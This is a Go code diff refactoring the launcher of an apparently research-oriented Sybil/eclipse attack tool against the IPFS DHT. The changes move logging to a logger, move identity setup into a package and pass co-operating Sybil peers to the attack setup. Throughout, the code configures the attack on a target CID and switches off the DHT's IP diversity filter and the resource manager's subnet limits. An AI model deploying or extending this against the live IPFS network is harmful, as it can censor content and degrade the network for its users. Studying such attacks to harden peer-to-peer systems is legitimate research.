@@ -2,25 +2,22 @@ package main
 
 import (
 	"context"
-	"encoding/base64"
 	"flag"
 	"fmt"
-	"github.com/ipfs/kubo/config"
+	gocid "github.com/ipfs/go-cid"
 	"github.com/ipfs/kubo/core"
 	dht "github.com/libp2p/go-libp2p-kad-dht"
-	"github.com/libp2p/go-libp2p/core/crypto"
 	"github.com/libp2p/go-libp2p/core/peer"
 	rcmgr "github.com/libp2p/go-libp2p/p2p/host/resource-manager"
-	"github.com/multiformats/go-multiaddr"
+	"github.com/vicnetto/active-sybil-attack/logger"
+	ipfspeer "github.com/vicnetto/active-sybil-attack/node/peer"
 	"os"
 	"os/signal"
 	"sybil/friends"
-	instanciate "sybil/instantiate"
 	"syscall"
-	"time"
-
-	gocid "github.com/ipfs/go-cid"
 )
+
+var log = logger.InitializeLogger()
 
 type FlagConfig struct {
 	isActive *bool
@@ -30,34 +27,6 @@ type FlagConfig struct {
 	ip             *string
 	port           int
 	sybilsFilePath *string
-}
-
-func configForSybil(flagConfig FlagConfig) instanciate.PeerConfig {
-	peerConfig := instanciate.PeerConfig{}
-
-	peerConfig.Port = flagConfig.port
-	peerConfig.Ip = flagConfig.ip
-	peerConfig.SybilFilePath = flagConfig.sybilsFilePath
-
-	marshaledPublic, err := base64.StdEncoding.DecodeString(*flagConfig.privateKey)
-	if err != nil {
-		panic(fmt.Errorf("decode error: %s", err))
-	}
-
-	unmarshalPrivate, err := crypto.UnmarshalPrivateKey(marshaledPublic)
-	if err != nil {
-		panic(fmt.Errorf("unmarshal error: %s", err))
-	}
-
-	public := unmarshalPrivate.GetPublic()
-	peerId, err := peer.IDFromPublicKey(public)
-	if err != nil {
-		panic(fmt.Errorf("id from public key error: %s", err))
-	}
-
-	peerConfig.Identity = config.Identity{PeerID: peerId.String(), PrivKey: *flagConfig.privateKey}
-
-	return peerConfig
 }
 
 func help() func() {
@@ -95,32 +64,32 @@ func treatFlags() *FlagConfig {
 	missingFlag := false
 
 	if (!*flagConfig.isActive && !*isPassive) || (*flagConfig.isActive == true && *isPassive == true) {
-		fmt.Println("error: one mode should be specified.")
+		log.Info.Println("error: one mode should be specified.")
 		missingFlag = true
 	}
 
 	if len(*flagConfig.privateKey) == 0 {
-		fmt.Println("error: flag privateKey missing.")
+		log.Info.Println("error: flag privateKey missing.")
 		missingFlag = true
 	}
 
 	if len(*flagConfig.eclipsedCid) == 0 {
-		fmt.Println("error: flag cid missing.")
+		log.Info.Println("error: flag cid missing.")
 		missingFlag = true
 	}
 
 	if len(*flagConfig.ip) == 0 {
-		fmt.Println("error: flag ip missing.")
+		log.Info.Println("error: flag ip missing.")
 		missingFlag = true
 	}
 
 	if flagConfig.port == 0 {
-		fmt.Println("error: flag port missing.")
+		log.Info.Println("error: flag port missing.")
 		missingFlag = true
 	}
 
 	if missingFlag {
-		fmt.Println()
+		log.Info.Println()
 		flag.Usage()
 		os.Exit(1)
 	}
@@ -128,65 +97,56 @@ func treatFlags() *FlagConfig {
 	return &flagConfig
 }
 
-func printTimestamp() {
-	fmt.Printf("[%s] ", time.Now().Format(time.RFC3339))
-}
-
 func main() {
 	flagConfig := treatFlags()
 
 	ctx, cancel := context.WithCancel(context.Background())
 
-	sybilConfig := configForSybil(*flagConfig)
+	sybilConfig := ipfspeer.ConfigForSybil(flagConfig.ip, flagConfig.port, *flagConfig.privateKey)
 
-	printTimestamp()
-	fmt.Println("Initializing instantiate with following parameters:")
-	fmt.Println("	- PeerID:", sybilConfig.Identity.PeerID)
-	fmt.Println("	- Port:", sybilConfig.Port)
-	fmt.Println("	- Eclipsed CID:", *flagConfig.eclipsedCid)
-	fmt.Println("	- Active mode:", *flagConfig.isActive, "\n")
+	log.Info.Println("Initializing sybil with following parameters:")
+	log.Info.Println(" PeerID:", sybilConfig.Identity.PeerID)
+	log.Info.Println(" Port:", sybilConfig.Port)
+	log.Info.Println(" Eclipsed CID:", *flagConfig.eclipsedCid)
+	log.Info.Println(" Active mode:", *flagConfig.isActive, "\n")
 
-	var otherSybils []multiaddr.Multiaddr
+	var otherSybils []peer.AddrInfo
 	if len(*flagConfig.sybilsFilePath) != 0 {
-		printTimestamp()
-		otherSybils = friends.ReadAndFormatOtherPeers(*flagConfig.sybilsFilePath, *flagConfig.privateKey)
+		otherSybils = friends.ReadOtherPeersAsPeerInfo(*flagConfig.sybilsFilePath, sybilConfig.Identity.PrivKey, *sybilConfig.Ip)
 	}
 
-	nodeApi, node, err := instanciate.SpawnEphemeral(ctx, sybilConfig, otherSybils)
+	nodeApi, node, err := ipfspeer.SpawnEphemeral(ctx, sybilConfig)
 	if err != nil {
 		panic(err)
 	}
 
 	// Set attack configuration to avoid IP filters and specify the CID to be eclipsed
-	dht.SetAttackConfiguration(*flagConfig.eclipsedCid, *flagConfig.isActive)
+	dht.SetAttackConfiguration(*flagConfig.eclipsedCid, *flagConfig.isActive, otherSybils)
 	dht.SetGroupToBypassDiversityFilter(friends.ExtractGroupFromIp(*flagConfig.ip))
 	rcmgr.SetAllowedIpForSubnetLimit(*flagConfig.ip)
 
 	decode, err := gocid.Decode(*flagConfig.eclipsedCid)
 	if err != nil {
-		fmt.Println("error: invalid CID passed as parameter.")
-		fmt.Println(err)
+		log.Info.Println("error: invalid CID passed as parameter.")
+		log.Info.Println(err)
 		return
 	}
 
 	// Get closest peers to establish the node in the network
 	peers, err := node.DHT.WAN.GetClosestPeers(ctx, string(decode.Hash()))
-	printTimestamp()
-	fmt.Printf("Closest peers to %s: %q\n\n", decode.String(), peers)
+	log.Info.Printf("Closest peers to %s: %q\n\n", decode.String(), peers)
 
 	myAddresses, err := nodeApi.Swarm().ListenAddrs(ctx)
-	printTimestamp()
-	fmt.Println("My addresses:", myAddresses, "\n")
+	log.Info.Println("My addresses:", myAddresses, "\n")
 
 	// Only if has other sybils to connect
-	if len(otherSybils) != 0 {
-		duration := time.Duration(5*len(otherSybils)) * time.Second
-		printTimestamp()
-		fmt.Println("Sleeping for", duration, "before connecting to other sybils...", "\n")
+	// if len(otherSybils) != 0 {
+	// 	duration := time.Duration(5*len(otherSybils)) * time.Second
+	// 	log.Info.Println("Sleeping for", duration, "before connecting to other sybils...", "\n")
 
-		time.Sleep(duration)
-		friends.ConnectToOtherSybils(ctx, nodeApi, node, otherSybils)
-	}
+	// 	time.Sleep(duration)
+	// 	friends.ConnectToOtherSybils(ctx, nodeApi, node, otherSybils)
+	// }
 
 	run(node, cancel)
 }
@@ -197,7 +157,7 @@ func run(node *core.IpfsNode, cancel func()) {
 	signal.Notify(c, os.Interrupt, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM)
 	<-c
 
-	fmt.Printf("\rExiting...\n")
+	log.Info.Printf("Exiting...\n")
 
 	cancel()
 
